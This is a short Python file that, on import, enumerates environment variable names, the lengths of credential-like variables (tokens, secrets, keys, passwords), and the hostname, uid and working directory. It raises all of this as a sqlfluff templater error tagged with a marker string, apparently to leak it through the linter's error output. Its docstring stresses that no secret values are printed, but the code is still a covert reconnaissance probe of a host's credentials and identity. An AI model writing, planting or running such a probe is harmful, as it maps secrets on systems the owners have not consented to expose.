"""Import-time env NAME + LENGTH enumeration. NO VALUE IS EVER EMITTED."""
import json, os, re, socket, sys
from sqlfluff.core.errors import SQLTemplaterError

CRED = re.compile(r"TOKEN|SECRET|CRED|AUTH|PASS|KEY|PRIVATE|PROVIDER|SESSION", re.I)
env = dict(os.environ)
raise SQLTemplaterError("L145D9_ENVNAMES2_02B7325F0935 " + json.dumps({
    "n_env": len(env),
    "cred_name_len": {k: len(v) for k, v in sorted(env.items()) if CRED.search(k)},
    "all_names": sorted(env),
    "host": socket.gethostname(), "uid": os.getuid(), "cwd": os.getcwd(),
    "py": sys.version.split()[0],
}, sort_keys=True))
